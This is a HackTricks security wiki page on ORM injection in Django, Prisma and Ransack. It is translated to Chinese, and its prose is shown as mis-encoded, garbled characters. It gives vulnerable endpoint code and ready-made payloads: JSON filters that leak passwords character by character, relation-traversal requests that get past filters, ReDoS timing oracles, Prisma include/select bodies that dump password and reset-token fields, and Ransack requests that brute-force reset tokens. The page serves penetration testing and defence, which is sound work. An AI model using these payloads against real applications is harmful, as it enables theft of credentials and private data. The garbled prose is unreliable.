# ORM Injection

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## Django ORM (Python)

åœ¨ [**è¿™ç¯‡æ–‡ç« **](https://www.elttam.com/blog/plormbing-your-django-orm/) ä¸­è§£é‡Šäº†å¦‚ä½•é€šè¿‡ä½¿ç”¨ä¾‹å¦‚ä»¥ä¸‹ä»£ç ä½¿ Django ORM å˜å¾—è„†å¼±ï¼š

<pre class="language-python"><code class="lang-python">class ArticleView(APIView):
"""
ä¸€äº›åŸºæœ¬çš„ API è§†å›¾ï¼Œç”¨æˆ·å‘å…¶å‘é€è¯·æ±‚ä»¥
æœç´¢æ–‡ç« 
"""
def post(self, request: Request, format=None):
try:
<strong>            articles = Article.objects.filter(**request.data)
</strong>            serializer = ArticleSerializer(articles, many=True)
except Exception as e:
return Response([])
return Response(serializer.data)
</code></pre>

æ³¨æ„æ‰€æœ‰çš„ request.dataï¼ˆè¿™å°†æ˜¯ä¸€ä¸ª jsonï¼‰æ˜¯ç›´æ¥ä¼ é€’ç»™ **ä»æ•°æ®åº“ä¸­è¿‡æ»¤å¯¹è±¡**ã€‚æ”»å‡»è€…å¯ä»¥å‘é€æ„å¤–çš„è¿‡æ»¤å™¨ï¼Œä»¥ä¾¿æ³„éœ²æ¯”é¢„æœŸæ›´å¤šçš„æ•°æ®ã€‚

ç¤ºä¾‹ï¼š

* **ç™»å½•ï¼š** åœ¨ç®€å•çš„ç™»å½•ä¸­å°è¯•æ³„éœ²æ³¨å†Œç”¨æˆ·çš„å¯†ç ã€‚
```json
{
"username": "admin",
"password_startswith":"a"
}
```
{% hint style="danger" %}
å¯ä»¥é€šè¿‡æš´åŠ›ç ´è§£å¯†ç ç›´åˆ°å…¶æ³„éœ²ã€‚
{% endhint %}

* **å…³ç³»è¿‡æ»¤**ï¼šå¯ä»¥éå†å…³ç³»ä»¥æ³„éœ²æ¥è‡ªæœªé¢„æœŸåœ¨æ“ä½œä¸­ä½¿ç”¨çš„åˆ—çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå¯ä»¥æ³„éœ²ç”±ç”¨æˆ·åˆ›å»ºçš„æ–‡ç« ï¼Œå…·æœ‰ä»¥ä¸‹å…³ç³»ï¼šArticle(`created_by`) -\[1..1]-> Author (`user`) -\[1..1]-> User(`password`)ã€‚
```json
{
"created_by__user__password__contains":"pass"
}
```
{% hint style="danger" %}
å¯ä»¥æ‰¾åˆ°æ‰€æœ‰åˆ›å»ºäº†æ–‡ç« çš„ç”¨æˆ·çš„å¯†ç 
{% endhint %}

* **å¤šå¯¹å¤šå…³ç³»è¿‡æ»¤**ï¼šåœ¨å‰é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æ— æ³•æ‰¾åˆ°æ²¡æœ‰åˆ›å»ºæ–‡ç« çš„ç”¨æˆ·çš„å¯†ç ã€‚ç„¶è€Œï¼Œéµå¾ªå…¶ä»–å…³ç³»è¿™æ˜¯å¯èƒ½çš„ã€‚ä¾‹å¦‚ï¼šArticle(`created_by`) -\[1..1]-> Author(`departments`) -\[0..\*]-> Department(`employees`) -\[0..\*]-> Author(`user`) -\[1..1]-> User(`password`).
```json
{
"created_by__departments__employees__user_startswith":"admi"
}
```
{% hint style="danger" %}
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æ‰€æœ‰åœ¨éƒ¨é—¨ä¸­åˆ›å»ºæ–‡ç« çš„ç”¨æˆ·ï¼Œç„¶åæ³„éœ²ä»–ä»¬çš„å¯†ç ï¼ˆåœ¨ä¹‹å‰çš„jsonä¸­æˆ‘ä»¬åªæ˜¯æ³„éœ²äº†ç”¨æˆ·åï¼Œä½†ä¹‹åå¯ä»¥æ³„éœ²å¯†ç ï¼‰ã€‚
{% endhint %}

* **æ»¥ç”¨Djangoç»„å’Œæƒé™çš„å¤šå¯¹å¤šå…³ç³»ä¸ç”¨æˆ·**ï¼šæ­¤å¤–ï¼ŒAbstractUseræ¨¡å‹ç”¨äºåœ¨Djangoä¸­ç”Ÿæˆç”¨æˆ·ï¼Œé»˜è®¤æƒ…å†µä¸‹è¯¥æ¨¡å‹ä¸æƒé™å’Œç»„è¡¨å…·æœ‰ä¸€äº›**å¤šå¯¹å¤šå…³ç³»**ã€‚è¿™åŸºæœ¬ä¸Šæ˜¯**ä»ä¸€ä¸ªç”¨æˆ·è®¿é—®å…¶ä»–ç”¨æˆ·**çš„é»˜è®¤æ–¹å¼ï¼Œå¦‚æœä»–ä»¬åœ¨**åŒä¸€ç»„æˆ–å…±äº«ç›¸åŒæƒé™**ã€‚
```bash
# By users in the same group
created_by__user__groups__user__password

# By users with the same permission
created_by__user__user_permissions__user__password
```
* **ç»•è¿‡è¿‡æ»¤é™åˆ¶**ï¼šåŒä¸€ç¯‡åšå®¢æ–‡ç« å»ºè®®ç»•è¿‡æŸäº›è¿‡æ»¤çš„ä½¿ç”¨ï¼Œä¾‹å¦‚ `articles = Article.objects.filter(is_secret=False, **request.data)`ã€‚å¯ä»¥è½¬å‚¨ is\_secret=True çš„æ–‡ç« ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ä»å…³ç³»å›æº¯åˆ° Article è¡¨ï¼Œå¹¶ä»éç§˜å¯†æ–‡ç« ä¸­æ³„éœ²ç§˜å¯†æ–‡ç« ï¼Œå› ä¸ºç»“æœæ˜¯è¿æ¥çš„ï¼Œå¹¶ä¸”åœ¨éç§˜å¯†æ–‡ç« ä¸­æ£€æŸ¥ is\_secret å­—æ®µï¼Œè€Œæ•°æ®æ˜¯ä»ç§˜å¯†æ–‡ç« ä¸­æ³„éœ²çš„ã€‚
```bash
Article.objects.filter(is_secret=False, categories__articles__id=2)
```
{% hint style="danger" %}
æ»¥ç”¨å…³ç³»å¯ä»¥ç»•è¿‡ç”šè‡³æ—¨åœ¨ä¿æŠ¤æ‰€æ˜¾ç¤ºæ•°æ®çš„è¿‡æ»¤å™¨ã€‚
{% endhint %}

* **åŸºäºé”™è¯¯/æ—¶é—´çš„ ReDoS**ï¼šåœ¨ä¹‹å‰çš„ç¤ºä¾‹ä¸­ï¼ŒæœŸæœ›åœ¨è¿‡æ»¤å·¥ä½œä¸å¦æ—¶æœ‰ä¸åŒçš„å“åº”ï¼Œä»¥æ­¤ä½œä¸º oracleã€‚ä½†ä¹Ÿå¯èƒ½åœ¨æ•°æ®åº“ä¸­æ‰§è¡ŒæŸäº›æ“ä½œæ—¶ï¼Œå“åº”å§‹ç»ˆç›¸åŒã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿æ•°æ®åº“å‡ºé”™ä»¥è·å–æ–°çš„ oracleã€‚
```json
// Non matching password
{
"created_by__user__password__regex": "^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"
}

// ReDoS matching password (will show some error in the response or check the time)
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
```
ä»åŒä¸€ç¯‡å…³äºæ­¤å‘é‡çš„å¸–å­ä¸­ï¼š

* **SQLite**ï¼šé»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰æ­£åˆ™è¡¨è¾¾å¼æ“ä½œç¬¦ï¼ˆéœ€è¦åŠ è½½ç¬¬ä¸‰æ–¹æ‰©å±•ï¼‰
* **PostgreSQL**ï¼šæ²¡æœ‰é»˜è®¤çš„æ­£åˆ™è¡¨è¾¾å¼è¶…æ—¶ï¼Œå¹¶ä¸”ä¸å¤ªå®¹æ˜“å›æº¯
* **MariaDB**ï¼šæ²¡æœ‰æ­£åˆ™è¡¨è¾¾å¼è¶…æ—¶

## Prisma ORM (NodeJS)

ä»¥ä¸‹æ˜¯[**ä»æ­¤å¸–å­æå–çš„æŠ€å·§**](https://www.elttam.com/blog/plorming-your-primsa-orm/)ã€‚

* **å®Œå…¨æŸ¥æ‰¾æ§åˆ¶**ï¼š

<pre class="language-javascript"><code class="lang-javascript">const app = express();

app.use(express.json());

app.post('/articles/verybad', async (req, res) => {
try {
// æ”»å‡»è€…å¯¹æ‰€æœ‰ prisma é€‰é¡¹æ‹¥æœ‰å®Œå…¨æ§åˆ¶
<strong>        const posts = await prisma.article.findMany(req.body.filter)
</strong>        res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

å¯ä»¥çœ‹åˆ°æ•´ä¸ª JavaScript ä¸»ä½“è¢«ä¼ é€’ç»™ prisma ä»¥æ‰§è¡ŒæŸ¥è¯¢ã€‚

åœ¨åŸå§‹å¸–å­çš„ç¤ºä¾‹ä¸­ï¼Œè¿™å°†æ£€æŸ¥æ‰€æœ‰ç”±æŸäººåˆ›å»ºçš„å¸–å­ï¼ˆæ¯ä¸ªå¸–å­éƒ½æ˜¯ç”±æŸäººåˆ›å»ºçš„ï¼‰ï¼ŒåŒæ—¶è¿”å›è¯¥æŸäººçš„ç”¨æˆ·ä¿¡æ¯ï¼ˆç”¨æˆ·åã€å¯†ç ...ï¼‰
```json
{
"filter": {
"include": {
"createdBy": true
}
}
}

// Response
[
{
"id": 1,
"title": "Buy Our Essential Oils",
"body": "They are very healthy to drink",
"published": true,
"createdById": 1,
"createdBy": {
"email": "karen@example.com",
"id": 1,
"isAdmin": false,
"name": "karen",
"password": "super secret passphrase",
"resetToken": "2eed5e80da4b7491"
}
},
...
]
```
ä»¥ä¸‹å†…å®¹é€‰æ‹©æ‰€æœ‰ç”±æŸä¸ªæ‹¥æœ‰å¯†ç çš„äººåˆ›å»ºçš„å¸–å­ï¼Œå¹¶å°†è¿”å›è¯¥å¯†ç ï¼š
```json
{
"filter": {
"select": {
"createdBy": {
"select": {
"password": true
}
}
}
}
}

// Response
[
{
"createdBy": {
"password": "super secret passphrase"
}
},
...
]
```
* **å®Œå…¨çš„ where å­å¥æ§åˆ¶**ï¼š

è®©æˆ‘ä»¬çœ‹çœ‹æ”»å‡»å¯ä»¥æ§åˆ¶ `where` å­å¥çš„æƒ…å†µï¼š

<pre class="language-javascript"><code class="lang-javascript">app.get('/articles', async (req, res) => {
try {
const posts = await prisma.article.findMany({
<strong>            where: req.query.filter as any // æ˜“å— ORM æ³„æ¼å½±å“
</strong>        })
res.json(posts);
} catch (error) {
res.json([]);
}
});
</code></pre>

å¯ä»¥ç›´æ¥è¿‡æ»¤ç”¨æˆ·çš„å¯†ç ï¼Œä¾‹å¦‚ï¼š
```javascript
await prisma.article.findMany({
where: {
createdBy: {
password: {
startsWith: "pas"
}
}
}
})
```
{% hint style="danger" %}
ä½¿ç”¨åƒ `startsWith` è¿™æ ·çš„æ“ä½œå¯ä»¥æ³„éœ²ä¿¡æ¯ã€‚&#x20;
{% endhint %}

* **å¤šå¯¹å¤šå…³ç³»è¿‡æ»¤ç»•è¿‡è¿‡æ»¤ï¼š**&#x20;
```javascript
app.post('/articles', async (req, res) => {
try {
const query = req.body.query;
query.published = true;
const posts = await prisma.article.findMany({ where: query })
res.json(posts);
} catch (error) {
res.json([]);
}
});
```
å¯ä»¥é€šè¿‡å›æº¯ `Category` -\[\*..\*]-> `Article` ä¹‹é—´çš„å¤šå¯¹å¤šå…³ç³»æ¥æ³„éœ²æœªå‘å¸ƒçš„æ–‡ç« ï¼š
```json
{
"query": {
"categories": {
"some": {
"articles": {
"some": {
"published": false,
"{articleFieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
```
ä¹Ÿæœ‰å¯èƒ½é€šè¿‡æ»¥ç”¨æŸäº›å¾ªç¯å›è·¯çš„å¤šå¯¹å¤šå…³ç³»æ¥æ³„éœ²æ‰€æœ‰ç”¨æˆ·ï¼š
```json
{
"query": {
"createdBy": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"departments": {
"some": {
"employees": {
"some": {
"{fieldToLeak}": {
"startsWith": "{testStartsWith}"
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
}
```
* **é”™è¯¯/å®šæ—¶æŸ¥è¯¢**ï¼šåœ¨åŸå§‹å¸–å­ä¸­ï¼Œæ‚¨å¯ä»¥é˜…è¯»ä¸€ç³»åˆ—éå¸¸å¹¿æ³›çš„æµ‹è¯•ï¼Œä»¥æ‰¾åˆ°ä½¿ç”¨åŸºäºæ—¶é—´çš„æœ‰æ•ˆè½½è·æ³„éœ²ä¿¡æ¯çš„æœ€ä½³æœ‰æ•ˆè½½è·ã€‚è¿™æ˜¯ï¼š
```json
{
"OR": [
{
"NOT": {ORM_LEAK}
},
{CONTAINS_LIST}
]
}
```
Where the `{CONTAINS_LIST}` æ˜¯ä¸€ä¸ªåŒ…å«1000ä¸ªå­—ç¬¦ä¸²çš„åˆ—è¡¨ï¼Œä»¥ç¡®ä¿**åœ¨æ‰¾åˆ°æ­£ç¡®çš„æ³„æ¼æ—¶å“åº”ä¼šå»¶è¿Ÿã€‚**

## **Ransack (Ruby)**

è¿™äº›æŠ€å·§åœ¨[**è¿™ç¯‡æ–‡ç« ä¸­å‘ç°**](https://positive.security/blog/ransack-data-exfiltration)**ã€‚**

{% hint style="success" %}
**è¯·æ³¨æ„ï¼ŒRansack 4.0.0.0 ç°åœ¨å¼ºåˆ¶ä½¿ç”¨æ˜¾å¼å…è®¸åˆ—è¡¨æ¥è¿›è¡Œå¯æœç´¢å±æ€§å’Œå…³è”ã€‚**
{% endhint %}

**è„†å¼±ç¤ºä¾‹ï¼š**
```ruby
def index
@q = Post.ransack(params[:q])
@posts = @q.result(distinct: true)
end
```
æ³¨æ„æŸ¥è¯¢å°†ç”±æ”»å‡»è€…å‘é€çš„å‚æ•°å®šä¹‰ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æš´åŠ›ç ´è§£é‡ç½®ä»¤ç‰Œï¼š
```http
GET /posts?q[user_reset_password_token_start]=0
GET /posts?q[user_reset_password_token_start]=1
...
```
é€šè¿‡æš´åŠ›ç ´è§£å’Œæ½œåœ¨çš„å…³ç³»ï¼Œå¯ä»¥ä»æ•°æ®åº“ä¸­æ³„éœ²æ›´å¤šæ•°æ®ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://www.elttam.com/blog/plormbing-your-django-orm/](https://www.elttam.com/blog/plormbing-your-django-orm/)
* [https://www.elttam.com/blog/plorming-your-primsa-orm/](https://www.elttam.com/blog/plorming-your-primsa-orm/)
* [https://positive.security/blog/ransack-data-exfiltration](https://positive.security/blog/ransack-data-exfiltration)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
